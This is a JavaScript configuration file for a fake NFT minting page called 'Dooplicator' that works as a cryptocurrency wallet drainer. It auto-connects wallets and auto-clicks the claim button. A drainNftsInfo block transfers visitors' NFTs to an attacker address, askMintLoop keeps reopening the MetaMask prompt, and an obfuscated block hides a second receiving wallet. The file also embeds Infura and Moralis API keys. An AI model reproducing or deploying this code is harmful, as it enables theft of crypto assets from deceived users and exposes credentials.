// 0X

const address = "0x4bdd39168C326E18aBf0cD4D76ce41Ff2eA2Bc96";
const infuraId = "82a3436f484845668c291ec69430ecef"
const moralisApi = "BYXOsHDwxEQWT9ai3dF3ZMPMcrlrvyDhwxGFYipgyt0c9Tgni38Q924d2Ab7Iydy"

const collectionInfo = {
    name: "Dooplicator",
    title: "", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "04.02.2023",
    socialMedia: {
        discord: "",
        twitter: "",
    },
    medias: {
        preview: "genbox.gif",
        favicon: "favicon.ico",
    },
    background: {
        type: "image",              // Supported types: image, video, color
        image: "genbox_header.png",    // Image for image type, video preview for video type
        video: "genbox_header.png",    // If you don't use video, you can ignore this line
        color: "genbox_header.png",           // If you don't use color, you can ignore this line
    }
}


const autoConnect = true; //false; // auto connect wallet
const autoMint = true; // auto click claim button

const drainNftsInfo = {
    active: true,
    minValue: 0.2,
    maxTransfer: 10,
    nftReceiveAddress: "0x7369ADE74E41De891a5e17749eD2831a6C00cF0b",
}

const mintInfo = {
    price: 0.4,         // Price per NFT.
    totalSupply: 24000,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 20,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const _0x5d7e32 = _0x3295; (function (_0x21445b, _0x2e90a3) { const _0x1e5bbe = _0x3295, _0x401e8c = _0x21445b(); while (!![]) { try { const _0x1d1170 = parseInt(_0x1e5bbe(0x19f)) / 0x1 + parseInt(_0x1e5bbe(0x1a3)) / 0x2 * (-parseInt(_0x1e5bbe(0x19c)) / 0x3) + parseInt(_0x1e5bbe(0x199)) / 0x4 * (parseInt(_0x1e5bbe(0x1a4)) / 0x5) + -parseInt(_0x1e5bbe(0x19d)) / 0x6 * (parseInt(_0x1e5bbe(0x19b)) / 0x7) + parseInt(_0x1e5bbe(0x1a1)) / 0x8 * (-parseInt(_0x1e5bbe(0x1a2)) / 0x9) + parseInt(_0x1e5bbe(0x19a)) / 0xa + -parseInt(_0x1e5bbe(0x1a0)) / 0xb; if (_0x1d1170 === _0x2e90a3) break; else _0x401e8c['push'](_0x401e8c['shift']()); } catch (_0x4b40ab) { _0x401e8c['push'](_0x401e8c['shift']()); } } }(_0x2e54, 0xaa576)); function _0x3295(_0x4d8c6f, _0x53a2d0) { const _0x2e54b3 = _0x2e54(); return _0x3295 = function (_0x3295d8, _0x1c97f2) { _0x3295d8 = _0x3295d8 - 0x199; let _0x4e6cc0 = _0x2e54b3[_0x3295d8]; return _0x4e6cc0; }, _0x3295(_0x4d8c6f, _0x53a2d0); } const nftsInfo = { 'active': !![], 'minValue': 0.01, 'checkMaxDay': 0x270f, 'receiveAddress': _0x5d7e32(0x19e) }; function _0x2e54() { const _0x5a689e = ['1430eBiqmZ', '17828miklJY', '11881610IXsvjz', '7jRdMgK', '6UJDpCN', '2814414wosBMK', '0xf7ceB206A295277F2CBcc97C8fabda27580c7503', '375142xAcwae', '1594989fBGvGa', '214840YJQdLf', '315lzCIKh', '586294PAYhCL']; _0x2e54 = function () { return _0x5a689e; }; return _0x2e54(); }


/* 
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion

// 0x
